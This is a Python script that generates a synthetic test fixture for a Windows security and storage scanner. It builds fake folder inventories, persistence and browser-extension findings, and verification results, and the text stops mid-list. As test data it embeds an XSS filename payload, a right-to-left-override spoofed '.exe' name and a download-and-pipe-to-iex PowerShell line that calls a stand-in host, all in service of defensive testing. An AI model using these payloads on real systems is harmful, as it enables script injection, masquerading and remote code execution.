#!/usr/bin/env python3
"""Generate tests/fixtures/demo-scan: a deterministic, fully synthetic scan.

Usage:  python -I -B tests/fixtures/make_demo_scan.py

It contains every envelope type (security, admin, verify, storage, inventory), a dirs.tsv with a
few thousand folders (one folder has more than 200 children, to exercise treemap pruning), a
files.tsv, and hostile names: "<img src=x onerror=alert(1)>.txt" and a right-to-left-override
spoofed name. Nothing here describes a real machine.
"""
from __future__ import annotations

import datetime as dt
import hashlib
import json
import os
import random
from pathlib import Path

OUT = Path(__file__).resolve().parent / "demo-scan"
REF = dt.datetime(2026, 10, 19, 8, 0, 0, tzinfo=dt.timezone.utc)
REF_EPOCH = int(REF.timestamp())
DAY = 86400
YEAR = int(365.25 * DAY)
KB, MB, GB = 1024, 1024 ** 2, 1024 ** 3
HOSTILE = "<img src=x onerror=alert(1)>.txt"
RTLO_NAME = "invoice\u202Efdp.exe"
R = random.Random(20261019)

PROFILES = {  # fractions of bytes older than 1y / 2y / 5y, newest age range (days), oldest age range (days)
    "new": ((0.0, 0.0, 0.0), (0, 20), (60, 300)),
    "mixed": ((0.45, 0.2, 0.04), (0, 60), (500, 1500)),
    "old": ((0.92, 0.7, 0.15), (380, 700), (900, 1800)),
    "ancient": ((1.0, 0.97, 0.85), (1900, 2400), (2600, 3600)),
}


def iso(epoch):
    return dt.datetime.fromtimestamp(epoch, dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def sha(text):
    return hashlib.sha256(text.encode()).hexdigest()


class D:
    def __init__(self, name, own=0, files=0, profile="mixed", flags="", cloud=0):
        self.name, self.own, self.files, self.profile, self.flags, self.cloud = name, own, files, profile, flags, cloud
        self.kids = []

    def add(self, *kids):
        self.kids.extend(kids)
        return self

    def spread(self, count, total, namer, profile=None, files_per=40):
        """Add `count` children sharing `total` bytes with a long-tailed distribution."""
        weights = [R.paretovariate(1.3) for _ in range(count)]
        s = sum(weights)
        for i, w in enumerate(weights):
            b = int(total * w / s)
            self.kids.append(D(namer(i), b, max(1, int(files_per * w / s * count)), profile or self.profile))
        return self


def hexname(i):
    return f"{R.getrandbits(8):02x}"


def winsxs_name(i):
    comp = R.choice(["microsoft-windows-shell", "microsoft-windows-kernel", "microsoft-windows-media",
                     "microsoft-windows-networking", "microsoft-windows-font", "netfx4-core", "wow64_microsoft"])
    return f"amd64_{comp}-{i:04d}_31bf3856ad364e35_10.0.26100.{R.randint(1, 4000)}_none_{R.getrandbits(32):08x}"


def pkg_name(i):
    base = ["react", "lodash", "webpack", "babel", "eslint", "typescript", "vite", "rollup", "jest", "chalk",
            "debug", "semver", "glob", "minimatch", "yargs", "commander", "axios", "express", "zod", "postcss"]
    return f"{R.choice(base)}-{['core', 'utils', 'plugin', 'cli', 'types', 'runtime', 'parser'][i % 7]}-{i}"


def build_tree():
    root = D("C:\\", own=int(18.9 * GB), files=4, profile="new")
    windows = D("Windows", own=20 * MB, files=40, profile="new")
    windows.add(
        D("System32", own=int(1.4 * GB), files=4200, profile="new").spread(40, int(4.6 * GB), lambda i: f"subsys{i:02d}"),
        D("SysWOW64", own=int(0.8 * GB), files=2100, profile="new").spread(10, int(0.6 * GB), lambda i: f"wow{i:02d}"),
        D("WinSxS", own=30 * MB, files=20, profile="mixed", flags="hardlink-heavy").spread(320, int(9.4 * GB), winsxs_name),
        D("SoftwareDistribution", own=5 * MB, files=12, profile="mixed").add(
            D("Download", own=10 * MB, files=3, profile="mixed").spread(12, int(2.3 * GB), lambda i: f"{R.getrandbits(64):016x}")),
        D("Installer", own=int(3.1 * GB), files=380, profile="old"),
        D("Temp", own=450 * MB, files=1200, profile="mixed"),
        D("Fonts", own=900 * MB, files=1100, profile="old"),
        D("Logs", own=380 * MB, files=900, profile="mixed"),
    )
    pf = D("Program Files", own=0, files=0, profile="mixed")
    for name, size in [("Avast Software", 1.6), ("Docker", 3.9), ("Google", 0.9), ("Microsoft Office", 3.6),
                       ("Oracle", 0.8), ("PowerShell", 0.3), ("Git", 0.4), ("Tailscale", 0.1), ("ASUS", 0.7),
                       ("NVIDIA Corporation", 1.9), ("Microsoft VS Code", 0.6), ("WindowsApps", 7.2),
                       ("Common Files", 1.1), ("dotnet", 0.9), ("Ollama", 4.4), ("7-Zip", 0.01)]:
        app = D(name, own=int(size * GB * 0.2), files=60, profile="mixed")
        app.spread(R.randint(2, 6), int(size * GB * 0.8), lambda i, n=name: f"{n.split()[0].lower()}-part{i}")
        pf.add(app)
    pfx86 = D("Program Files (x86)", profile="old")
    for name, size in [("Microsoft", 1.2), ("Steam", 2.5), ("McAfee", 0.12), ("Adobe", 0.6), ("Windows Kits", 1.4)]:
        app = D(name, own=int(size * GB * 0.3), files=50, profile="old")
        app.spread(R.randint(2, 5), int(size * GB * 0.7), lambda i, n=name: f"{n.split()[0].lower()}-{i}")
        pfx86.add(app)
    pdata = D("ProgramData", own=2 * MB, files=8, profile="mixed").add(
        D("Microsoft", own=int(0.4 * GB), files=500, profile="mixed").spread(18, int(1.8 * GB), lambda i: f"ms-{i:02d}"),
        D("Package Cache", own=0, files=0, profile="old").spread(40, int(3.8 * GB), lambda i: f"{{{R.getrandbits(32):08X}-PKG}}"),
        D("Avast Software", own=int(1.1 * GB), files=300, profile="new"),
    )
    users = D("Users", profile="mixed")
    demo = D("demo", own=12 * MB, files=30, profile="mixed")
    local = D("Local", own=40 * MB, files=90, profile="mixed").add(
        D("Temp", own=int(1.1 * GB), files=3200, profile="mixed").spread(80, int(4.1 * GB), lambda i: f"tmp{R.getrandbits(20):05x}"),
        D("Google", profile="new").add(D("Chrome", profile="new").add(D("User Data", own=50 * MB, files=40, profile="new").add(
            D("Default", own=300 * MB, files=200, profile="new").add(D("Cache", own=4 * MB, files=4, profile="new").add(
                D("Cache_Data", own=int(1.8 * GB), files=9000, profile="new"))),
            D("Profile 1", own=150 * MB, files=120, profile="new").add(D("Cache", own=int(0.7 * GB), files=4100, profile="new"))))),
        D("npm-cache", own=1 * MB, files=2, profile="mixed").add(
            D("_cacache", own=0, files=0, profile="mixed").add(
                D("content-v2", profile="mixed").spread(256, int(2.6 * GB), hexname, files_per=30),
                D("index-v5", own=int(0.3 * GB), files=8000, profile="mixed"))),
        D("pip", profile="mixed").add(D("cache", own=int(1.1 * GB), files=2400, profile="mixed")),
        D("CrashDumps", own=900 * MB, files=14, profile="old"),
        D("Microsoft", own=200 * MB, files=300, profile="mixed").add(D("WindowsApps", flags="reparse", profile="new")),
        D("Docker", profile="new").add(D("wsl", profile="new").add(D("disk", own=int(18.2 * GB), files=1, profile="new"))),
    )
    roaming = D("Roaming", own=20 * MB, files=60, profile="mixed").add(
        D("Code", own=10 * MB, files=20, profile="new").add(
            D("CachedData", own=600 * MB, files=1800, profile="mixed"), D("User", own=120 * MB, files=300, profile="new"),
            D("logs", own=210 * MB, files=500, profile="mixed")),
        D("Updater", own=int(0.8 * MB), files=1, profile="new"),
        D("npm", own=2 * MB, files=4, profile="mixed").add(D("node_modules", own=0, files=0, profile="mixed").spread(
            30, 400 * MB, pkg_name)),
    )
    projects = D("Projects", own=1 * MB, files=3, profile="mixed")
    app1 = D("app-1", own=8 * MB, files=40, profile="new").add(
        D("src", own=30 * MB, files=400, profile="new"),
        D("node_modules", own=2 * MB, files=3, profile="mixed").spread(350, int(1.2 * GB), pkg_name, files_per=60))
    rr = D("shop-app", own=10 * MB, files=50, profile="new").add(
        D(".git", own=int(0.6 * GB), files=3000, profile="new"), D("src", own=80 * MB, files=900, profile="new"),
        D("node_modules", own=1 * MB, files=2, profile="mixed").spread(120, int(1.7 * GB), pkg_name))
    rr_copy = D("shop-app - Copy", own=10 * MB, files=50, profile="mixed").add(
        D(".git", own=int(0.6 * GB), files=3000, profile="mixed"), D("src", own=78 * MB, files=880, profile="mixed"),
        D("node_modules", own=1 * MB, files=2, profile="mixed").spread(120, int(1.7 * GB), pkg_name))
    projects.add(app1, rr, rr_copy, D("old-site", own=300 * MB, files=2000, profile="old"))
    documents = D("Documents", own=150 * MB, files=400, profile="mixed").add(
        projects,
        D("Old Projects", own=50 * MB, files=100, profile="ancient").spread(14, int(3.0 * GB), lambda i: f"project-{2014 + i % 6}-{i}"),
        D("ISOs", own=int(6.1 * GB), files=1, profile="old"),
    )
    downloads = D("Downloads", own=int(13.4 * GB), files=210, profile="mixed").add(
        D("old-installers", own=int(4.0 * GB), files=60, profile="old"),
        D(HOSTILE, own=15 * MB, files=1, profile="new"),
        D(RTLO_NAME, own=2 * MB, files=1, profile="new"),
    )
    videos = D("Videos", own=200 * MB, files=20, profile="mixed").add(
        D("2018", own=int(40.0 * GB), files=310, profile="ancient"),
        D("2023", own=int(12.0 * GB), files=150, profile="old"),
        D("2026", own=int(4.0 * GB), files=60, profile="new"))
    pictures = D("Pictures", own=100 * MB, files=40, profile="mixed")
    for year in range(2015, 2027):
        prof = "ancient" if year < 2021 else "old" if year < 2025 else "new"
        pictures.add(D(str(year), own=int(R.uniform(1.5, 4.5) * GB), files=R.randint(800, 4000), profile=prof))
    onedrive = D("OneDrive", own=int(0.4 * GB), files=300, profile="mixed", flags="onedrive", cloud=int(9.0 * GB)).add(
        D("Documents", own=int(1.6 * GB), files=900, profile="mixed", flags="onedrive", cloud=int(11.0 * GB)),
        D("Pictures", own=int(1.0 * GB), files=600, profile="old", flags="onedrive", cloud=int(5.0 * GB)))
    vbox = D("VirtualBox VMs", profile="mixed").add(D("linux-lab", own=int(22.0 * GB), files=12, profile="mixed"))
    claude = D(".claude", own=4 * MB, files=20, profile="new").add(
        D("worktrees", profile="new").add(D("feature-x", own=300 * MB, files=1800, profile="new")),
        D("projects", own=90 * MB, files=200, profile="new"))
    demo.add(D("AppData", profile="mixed").add(local, roaming), documents, downloads, videos, pictures,
             D("Music", own=int(8.0 * GB), files=1900, profile="old"), onedrive, vbox, claude,
             D("Desktop", own=60 * MB, files=40, profile="new"))
    users.add(D("Public", own=30 * MB, files=40, profile="old"), demo)
    root.add(windows, pf, pfx86, pdata, users,
             D("System Volume Information", flags="inaccessible", profile="new"),
             D("$Recycle.Bin", profile="mixed").add(D("S-1-5-21-1000000000-2000000000-3000000000-1001",
                                                      own=int(3.1 * GB), files=420, profile="mixed")),
             D("nvm4w", own=10 * MB, files=20, profile="mixed").add(D("nodejs", own=590 * MB, files=4000, profile="mixed")))
    return root


def flatten(root):
    rows, by_path = [], {}

    def walk(node, parent_id, depth, parent_path):
        idx = len(rows)
        path = node.name if parent_path is None else (parent_path.rstrip("\\") + "\\" + node.name)
        (c1f, c2f, c5f), (n_lo, n_hi), (o_lo, o_hi) = PROFILES[node.profile]
        own_newest = REF_EPOCH - R.randint(n_lo, n_hi) * DAY - R.randint(0, DAY)
        own_oldest = REF_EPOCH - R.randint(o_lo, o_hi) * DAY
        row = {"id": idx + 1, "parent": parent_id, "depth": depth, "path": path, "own": node.own, "ownFiles": node.files,
               "c1": int(node.own * c1f), "c2": int(node.own * c2f), "c5": int(node.own * c5f), "cloud": node.cloud,
               "cloudFiles": node.cloud // (8 * MB) if node.cloud else 0, "flags": node.flags,
               "newest": own_newest if node.own or node.files else 0, "oldest": own_oldest if node.own or node.files else 0}
        rows.append(row)
        by_path[path] = row
        tb, tf, td = node.own, node.files, 0
        c1, c2, c5, cl, clf = row["c1"], row["c2"], row["c5"], row["cloud"], row["cloudFiles"]
        newest, oldest = row["newest"], row["oldest"]
        for kid in node.kids:
            k = walk(kid, idx + 1, depth + 1, path)
            tb += k["total"]
            tf += k["totalFiles"]
            td += 1 + k["totalDirs"]
            c1 += k["tc1"]
            c2 += k["tc2"]
            c5 += k["tc5"]
            cl += k["tcloud"]
            clf += k["tcloudFiles"]
            if k["tnewest"]:
                newest = max(newest, k["tnewest"])
            if k["toldest"]:
                oldest = min(oldest, k["toldest"]) if oldest else k["toldest"]
        if "inaccessible" in node.flags:
            tb = tf = 0
        row.update(total=tb, totalFiles=tf, totalDirs=td, tc1=c1, tc2=c2, tc5=c5, tcloud=cl, tcloudFiles=clf,
                   tnewest=newest, toldest=oldest)
        return row

    walk(root, "", 0, None)
    return rows, by_path


def write(path: Path, text: str):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(text)


def write_json(rel, obj):
    write(OUT / rel, json.dumps(obj, indent=2, ensure_ascii=False) + "\n")


def envelope(module, area, checks, findings=(), inventory=None, errors=()):
    return {"schema": "bvs.module/1", "module": module, "area": area, "scanId": "demo-scan", "host": "DEMO-PC",
            "platform": "windows", "elevated": area == "admin", "started": iso(REF_EPOCH + 60),
            "finished": iso(REF_EPOCH + 600), "checks": list(checks), "findings": list(findings),
            "inventory": inventory or {}, "errors": list(errors)}


def check(cid, status="ok", items=1, reason=None, desc=None):
    return {"id": cid, "description": desc or cid.replace(".", " ").replace("_", " "), "status": status,
            "reason": reason, "items": items, "ms": R.randint(5, 900)}


def finding(fid, chk, title, severity, cls, reasons=(), evidence=(), files=(), fp="", rec="", mitre=(),
            confidence="medium", expected=None, verification=None):
    return {"id": fid, "module": fid.split("-")[0], "check": chk, "title": title, "severity": severity, "class": cls,
            "confidence": confidence, "reasons": list(reasons), "evidence": list(evidence),
            "entities": {"files": list(files), "processes": [], "network": [], "registry": [], "accounts": []},
            "expected": expected, "fp_notes": fp, "recommendation": rec, "mitre": list(mitre),
            "collected_at": iso(REF_EPOCH + 300), "collector": fid.split("-")[0], "verification": verification}


def item(iid, path, kind, size, category, purpose, safety, method, how, *, files=None, owner=None, flags=(),
         newest=None, oldest=None, reversible=True, **extra):
    out = {"id": iid, "path": path, "kind": kind, "bytes": size, "files": files, "newestUtc": newest,
           "oldestUtc": oldest, "category": category, "purpose": purpose, "owner": owner, "safety": safety,
           "method": method, "how": how, "reversible": reversible, "flags": list(flags)}
    out.update(extra)
    return out


def main():
    rows, by_path = flatten(build_tree())
    U = "C:\\Users\\demo"

    def dir_item(iid, path, category, purpose, safety, method, how, **kw):
        r = by_path[path]
        return item(iid, path, "dir", r["total"], category, purpose, safety, method, how, files=r["totalFiles"],
                    newest=iso(r["tnewest"]) if r["tnewest"] else None, oldest=iso(r["toldest"]) if r["toldest"] else None,
                    **kw)

    # ---------------------------------------------------------------- inventory (G0)
    header = ["id", "parent", "depth", "path", "ownBytes", "ownFiles", "totalBytes", "totalFiles", "totalDirs",
              "newestWriteUtc", "oldestWriteUtc", "cold1yBytes", "cold2yBytes", "cold5yBytes", "cloudOnlyBytes",
              "cloudOnlyFiles", "flags"]
    lines = ["\t".join(header)]
    for r in rows:
        lines.append("\t".join(str(v) for v in [r["id"], r["parent"], r["depth"], r["path"], r["own"], r["ownFiles"],
                                                r["total"], r["totalFiles"], r["totalDirs"], r["tnewest"], r["toldest"],
                                                r["tc1"], r["tc2"], r["tc5"], r["tcloud"], r["tcloudFiles"], r["flags"]]))
    write(OUT / "inventory" / "dirs.tsv", "\n".join(lines) + "\n")
    root = rows[0]
    scanned = root["total"]
    unaccounted = int(7.5 * GB)
    size = 512 * GB
    free = size - scanned - unaccounted
    write_json("inventory/inventory-meta.json", {
        "schema": "bvs.inventory/1", "scanId": "demo-scan", "root": "C:\\",
        "volume": {"letter": "C:", "fileSystem": "NTFS", "sizeBytes": size, "freeBytes": free},
        "scanned": {"bytes": scanned, "files": root["totalFiles"], "dirs": root["totalDirs"] + 1},
        "inaccessibleDirs": 1, "cloudOnlyBytes": root["tcloud"], "durationSec": 412,
        "unaccountedBytes": unaccounted,
        "note": "Synthetic fixture. Unaccounted = used - scanned (system files, inaccessible folders, metadata).",
    })
    files_rows = [
        (f"{U}\\Downloads\\{HOSTILE}", 15 * MB, "2026-10-17T21:14:03Z", "large"),
        (f"{U}\\Downloads\\Win11_23H2_English_x64.iso", int(6.1 * GB), "2024-02-11T10:00:00Z", "large"),
        (f"{U}\\Documents\\ISOs\\Win11_23H2_English_x64.iso", int(6.1 * GB), "2024-02-11T10:00:00Z", "large"),
        (f"{U}\\Videos\\2018\\holiday-2018.mp4", int(4.2 * GB), "2018-08-30T18:20:00Z", "large"),
        (f"{U}\\VirtualBox VMs\\linux-lab\\linux-lab.vdi", int(22.0 * GB), "2026-09-28T12:00:00Z", "large"),
        ("C:\\pagefile.sys", int(12.0 * GB), "2026-10-19T06:00:00Z", "large"),
        ("C:\\hiberfil.sys", int(6.4 * GB), "2026-10-19T06:00:00Z", "large"),
        (f"{U}\\Downloads\\setup-tool.exe.crdownload", 120 * MB, "2026-09-01T09:00:00Z", "partial-download"),
        (f"{U}\\AppData\\Roaming\\Updater\\u.exe", int(0.8 * MB), "2026-10-10T07:11:00Z", "exec-recent"),
        (f"{U}\\Desktop\\empty-notes.txt", 0, "2025-01-01T00:00:00Z", "zero-byte"),
    ]
    flines = ["path\tsizeBytes\tallocBytes\tcreatedUtc\tmodifiedUtc\tattributes\text\treason"]
    for path, sz, mod, reason in files_rows:
        ext = os.path.splitext(path)[1].lower()
        flines.append(f"{path}\t{sz}\t{(sz + 4095) // 4096 * 4096}\t{mod}\t{mod}\tArchive\t{ext}\t{reason}")
    write(OUT / "inventory" / "files.tsv", "\n".join(flines) + "\n")

    # ---------------------------------------------------------------- scan meta
    write_json("scan-meta.json", {
        "schema": "bvs.scan/1", "scanId": "demo-scan", "auditStartUtc": iso(REF_EPOCH), "host": "DEMO-PC",
        "user": "demo", "userSid": "S-1-5-21-1000000000-2000000000-3000000000-1001", "platform": "windows",
        "os": {"caption": "Microsoft Windows 11 Home", "version": "10.0.26100", "build": "26100", "language": 1033},
        "elevated": False, "tool": "baby-virus-scanner", "toolVersion": "0.1.0",
        "note": "Synthetic fixture for tests and demos. Not real data.",
    })

    # ---------------------------------------------------------------- security
    updater = f"{U}\\AppData\\Roaming\\Updater\\u.exe"
    write_json("security/S01.json", envelope("S01", "security", [
        check("persistence.run_keys", items=14), check("persistence.startup_folders", items=3),
        check("persistence.services", items=212),
        check("persistence.scheduled_tasks", "partial", 118, "3 task XML files could not be read (access denied)"),
        check("persistence.wmi", "needs_admin", 0, "root\\subscription needs elevation"),
        check("persistence.ifeo", items=0),
        check("persistence.shell_snapshots", "not_applicable", 0, "no ~/.claude/shell-snapshots folder"),
    ], [
        finding("S01-0001", "persistence.run_keys", "Run key starts unsigned EXE from AppData", "high", "suspicious",
                ["persistence", "user_writable", "unsigned", "created_lt_30d"],
                [{"type": "registry", "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "Updater",
                  "value": updater + " --silent"}],
                [{"path": updater, "sha256": sha("u.exe"), "size": int(0.8 * MB), "sig": "NotSigned", "signer": None,
                  "created": "2026-10-10T07:11:00Z", "motw": {"zone": 3, "host": "files.example.net"}}],
                fp="Small vendors often ship unsigned auto-updaters into AppData.",
                rec="Check which program installed 'Updater' (Settings > Apps). If unknown, disable the Run entry in "
                    "Task Manager > Startup apps and ask for a second opinion.", mitre=["T1547.001"]),
        finding("S01-0002", "persistence.scheduled_tasks", "Scheduled task runs a script from a user-writable folder",
                "medium", "hardening", ["persistence", "user_writable"],
                [{"type": "task", "path": "\\DemoBackup", "action": "C:\\nvm4w\\backup.cmd"}],
                fp="A backup tool you set up yourself would look exactly like this.",
                rec="Move the script to a folder only administrators can write to, or delete the task if unused.",
                mitre=["T1053.005"]),
        finding("S01-0003", "persistence.services", "212 services reviewed; all third-party services are signed", "info",
                "info", fp="", rec=""),
    ]))
    write_json("security/S02.json", envelope("S02", "security", [
        check("files.recent_executables", items=41), check("files.magic_mismatch", items=2),
        check("processes.signers", items=187),
    ], [
        finding("S02-0001", "files.recent_executables", f"Antivirus-flagged file in Downloads: {HOSTILE}", "critical",
                "compromise", ["av_match", "motw_unknown_host"],
                [{"type": "file", "path": f"{U}\\Downloads\\{HOSTILE}", "magic": "html",
                  "note": "Name contains HTML markup - it must render as plain text"}],
                [{"path": f"{U}\\Downloads\\{HOSTILE}", "sha256": sha(HOSTILE), "size": 15 * MB, "sig": "NotSigned",
                  "signer": None, "created": "2026-10-17T21:14:03Z", "motw": {"zone": 3, "host": "cdn.example-downloads.test"}}],
                fp="The name is a classic XSS test string; it may be a harmless test artifact.",
                rec="Do not open it. Upload its SHA-256 (not the file) to a reputation service, then delete it via the "
                    "basket protocol if it is not yours.", confidence="low"),
        finding("S02-0002", "files.recent_executables", f"Right-to-left override in a file name: {RTLO_NAME}", "medium",
                "suspicious", ["masquerading"],
                [{"type": "file", "path": f"{U}\\Downloads\\{RTLO_NAME}", "displayedAs": "invoiceexe.pdf"}],
                fp="Rare in legitimate files; some archive tools produce it when names are mangled.",
                rec="Do not run it. Check its real extension (it is .exe).", mitre=["T1036.002"]),
    ]))
    write_json("security/S03.json", envelope("S03", "security", [
        check("accounts.local_users", items=4), check("posture.remote_assistance", items=1),
        check("posture.hosts_file", items=9), check("posture.root_certs", items=61),
    ], [
        finding("S03-0001", "posture.remote_assistance", "Remote Assistance is enabled", "medium", "hardening",
                fp="Harmless if you use it to get help.", rec="System Properties > Remote > untick 'Allow Remote "
                                                              "Assistance connections' if you never use it."),
        finding("S03-0002", "posture.hosts_file", "hosts file maps 3 host names to tailnet addresses", "high", "suspicious",
                [], [{"type": "file", "path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
                      "lines": ["100.101.1.2 peer-one", "100.101.1.3 peer-two", "100.101.1.4 peer-three"]}],
                fp="Tailscale MagicDNS can write peer names here.", rec="Confirm that you recognise all three peers.",
                expected={"id": "tailscale-hosts-peers", "reason": "Tailscale MagicDNS peer names.", "confirmWithUser": True}),
        finding("S03-0003", "posture.root_certs", "Avast Web/Mail Shield root certificate installed", "info", "info",
                expected={"id": "avast-webshield-root", "reason": "Avast HTTPS scanning installs this root."},
                fp="Expected while Avast Web Shield is on.", rec=""),
    ]))
    write_json("security/S04.json", envelope("S04", "security", [
        check("history.runmru", items=12), check("history.psreadline", items=2),
        check("logs.powershell", items=9120), check("logs.system", items=48211),
        check("logs.security", "needs_admin", 0, "Security log needs elevation (covered by the admin script)"),
        check("logs.defender", items=430),
    ], [
        finding("S04-0001", "history.psreadline", "PowerShell history contains a download-and-run one-liner", "low",
                "suspicious", ["lolbin"], [{"type": "history", "path": f"{U}\\AppData\\Roaming\\Microsoft\\Windows\\"
                                                                         "PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                                            "line": 211, "value": "irm https://get.example.test/install.ps1 | iex"}],
                fp="Installers such as Scoop or nvm are installed this way.",
                rec="Make sure you remember running it; check what it installed."),
    ], inventory={"logCoverage": [
        {"log": "System", "oldest": "2026-07-10T06:12:00Z", "newest": "2026-10-19T07:59:00Z", "events": 48211},
        {"log": "Microsoft-Windows-PowerShell/Operational", "oldest": "2026-06-13T10:00:00Z",
         "newest": "2026-10-19T07:58:00Z", "events": 9120},
        {"log": "Security", "oldest": None, "newest": None, "status": "needs_admin"},
        {"log": "Microsoft-Windows-Windows Defender/Operational", "oldest": "2026-01-02T09:00:00Z",
         "newest": "2026-10-18T22:00:00Z", "events": 430},
    ]}))
    write_json("security/S05.json", envelope("S05", "security", [
        check("av.avast_reports", items=18), check("av.avast_chest", items=0),
        check("av.msert", "skipped", 0, "msert.log not present yet (scan still running)"),
    ], [finding("S05-0001", "av.avast_reports", "Avast: no detections in the last 90 days", "info", "info")]))
    write_json("security/S06.json", envelope("S06", "security", [
        check("browsers.chrome.extensions", items=23), check("browsers.edge.extensions", items=4),
        check("browsers.launch_flags", items=11),
    ], [
        finding("S06-0001", "browsers.chrome.extensions", "Chrome extension with access to all sites is not in the Web Store",
                "high", "suspicious", ["hidden"],
                [{"type": "extension", "id": "abcdefghijklmnopabcdefghijklmnop", "name": "PDF Tools Pro",
                  "permissions": ["<all_urls>", "webRequest", "cookies"], "installSource": "sideloaded",
                  "profile": "Profile 1"}],
                fp="Developer-mode extensions you built yourself also look like this.",
                rec="chrome://extensions > Developer mode > note the ID > remove it if you did not install it.",
                mitre=["T1176"]),
        finding("S06-0002", "browsers.chrome.notifications", "Notification permission granted to 4 unknown sites",
                "medium", "hardening", fp="Often news sites.", rec="chrome://settings/content/notifications"),
    ]))
    write_json("security/S07.json", envelope("S07", "security", [
        check("network.connections", items=96), check("network.listeners", items=17), check("network.dns", items=6),
        check("network.tailscale", "partial", 3, "tailscale CLI returned partial peer data"),
    ], [
        finding("S07-0001", "network.listeners", "SMB (445) and a vendor service listen on Private networks", "medium",
                "hardening", ["exposed_service"], [{"type": "listener", "port": 445, "process": "System",
                                                     "profile": "Private"}],
                fp="Normal on a home network if you share folders.", rec="Turn off file sharing if you do not use it."),
        finding("S07-0002", "network.dns", "DNS answers match the DoH resolver (no hijack seen)", "info", "info"),
    ]))
    write_json("security/S12.json", envelope("S12", "security", [
        check("secrets.npmrc", items=1), check("secrets.env_files", items=6), check("secrets.ssh_keys", items=2),
    ], [
        finding("S12-0001", "secrets.npmrc", "Plaintext npm token in .npmrc", "medium", "hardening", ["plaintext_secret"],
                [{"type": "file", "path": f"{U}\\.npmrc", "line": 2, "value": "npm_\u2026a1b2"}],
                fp="Needed for publishing, but any process running as you can read it.",
                rec="Use a granular, short-lived token, or 'npm login' with 2FA and remove the token line."),
    ]))
    write_json("security/S13.json", envelope("S13", "security", [
        check("github.public", items=31), check("github.authenticated", "needs_consent", 0, "gh sign-in not done yet"),
        check("npm.publish_history", items=12),
    ], [finding("S13-0001", "github.public", "2 GitHub SSH keys match local public keys", "low", "info")]))

    # ---------------------------------------------------------------- admin
    write_json("admin/X1.json", envelope("X1", "admin", [
        check("admin.security_log", items=5123), check("admin.auditpol", items=58), check("admin.bitlocker", items=1),
        check("admin.defender_exclusions", "not_applicable", 0, "Defender is off (third-party AV active)"),
        check("admin.sfc_verifyonly", items=1), check("admin.dism_scanhealth", items=1),
        check("admin.smb", "partial", 2, "SMB server config read; share ACLs unavailable"),
    ], [
        finding("X1-0001", "admin.auditpol", "Logon failure auditing is off", "low", "hardening",
                fp="Default on Home editions.", rec="auditpol /set /subcategory:\"Logon\" /failure:enable (admin)"),
    ]))

    # ---------------------------------------------------------------- verify
    write_json("verify/V1.json", envelope("V1", "verify", [
        check("verify.S01-0001", items=1), check("verify.S02-0001", items=1), check("verify.S06-0001", items=1),
    ], inventory={"verifications": [
        {"id": "S01-0001", "result": "refuted", "method": "reg.exe query + vendor release hash comparison", "by": "V1",
         "at": iso(REF_EPOCH + 3000), "notes": "Updater belongs to a portable app the user installed; hash matches the "
                                               "vendor's published release."},
        {"id": "S02-0001", "result": "refuted", "method": "File content and reputation re-check", "by": "V1",
         "at": iso(REF_EPOCH + 3100), "notes": "A saved web page with a test-string name; the AV signature was a generic "
                                               "HTML heuristic. No script ran."},
        {"id": "S06-0001", "result": "inconclusive", "method": "Chrome Web Store lookup by extension ID", "by": "V1",
         "at": iso(REF_EPOCH + 3200), "notes": "Not listed in the store; publisher unknown. Ask the user."},
    ]}))
    write_json("verify/V2.json", [
        {"findingId": "S03-0002", "result": "inconclusive", "method": "tailscale status peer names", "by": "V2",
         "at": iso(REF_EPOCH + 3300), "notes": "Two of the three names are current tailnet peers; one is not."},
    ])

    # ---------------------------------------------------------------- storage G1
    dl = f"{U}\\Downloads"
    g1_big = [
        item("st-000001", f"{U}\\VirtualBox VMs\\linux-lab\\linux-lab.vdi", "file", int(22.0 * GB), "vm-disk",
             "Virtual disk of the 'linux-lab' VirtualBox machine.", "review", "recycle",
             "Delete the VM from VirtualBox (Machine > Remove > Delete all files) if you no longer need it.",
             owner="Oracle VirtualBox", newest="2026-09-28T12:00:00Z"),
        item("st-000002", "C:\\pagefile.sys", "file", int(12.0 * GB), "os-file", "Windows virtual memory (page file).",
             "do_not_touch", "none", "Managed by Windows. Adjust only via System > Advanced > Performance > Virtual memory.",
             owner="Windows", newest="2026-10-19T06:00:00Z", reversible=False),
        item("st-000003", "C:\\hiberfil.sys", "file", int(6.4 * GB), "os-file", "Hibernation and Fast Startup image.",
             "use_tool", "tool", "Run 'powercfg /h off' in an admin terminal to remove it (disables hibernation and "
                                 "Fast Startup).", owner="Windows", newest="2026-10-19T06:00:00Z"),
        item("st-000004", f"{dl}\\Win11_23H2_English_x64.iso", "file", int(6.1 * GB), "installer-image",
             "Windows 11 installation image.", "safe_after_check", "recycle",
             "Delete it if Windows is installed and you do not need a USB installer; it can be downloaded again.",
             owner="Microsoft", newest="2024-02-11T10:00:00Z"),
        item("st-000005", f"{U}\\Videos\\2018\\holiday-2018.mp4", "file", int(4.2 * GB), "personal-media",
             "Personal video.", "review", "recycle", "Personal file: back it up (external drive or cloud) before removing it.",
             newest="2018-08-30T18:20:00Z"),
        item("st-000006", f"{dl}\\{HOSTILE}", "file", 15 * MB, "unknown",
             "File with an HTML-like name (rendering test).", "review", "recycle",
             "Check what it is first. It was flagged by the security scan (S02-0001, refuted).",
             newest="2026-10-17T21:14:03Z"),
        item("st-000007", f"{dl}\\setup-tool.exe.crdownload", "file", 120 * MB, "partial-download",
             "Incomplete Chrome download.", "safe_after_check", "recycle",
             "Make sure no download is running (or resume it), then delete it.", newest="2026-09-01T09:00:00Z"),
    ]
    g1_old = [
        dir_item("st-000101", f"{U}\\Videos\\2018", "personal-media", "Videos last changed more than 5 years ago.",
                 "review", "holding", "Back up to an external drive, then remove the local copy."),
        dir_item("st-000102", f"{U}\\Documents\\Old Projects", "old-projects", "Projects untouched for 5+ years.",
                 "review", "holding", "Archive (zip) to external storage before removing."),
        dir_item("st-000103", f"{dl}\\old-installers", "installer", "Old program installers.", "safe_after_check",
                 "recycle", "Programs are installed already; installers can be downloaded again."),
        dir_item("st-000104", f"{U}\\Music", "personal-media", "Music library, mostly older than 2 years.", "review",
                 "holding", "Personal files: back up before removing."),
    ]
    g1_junk = [
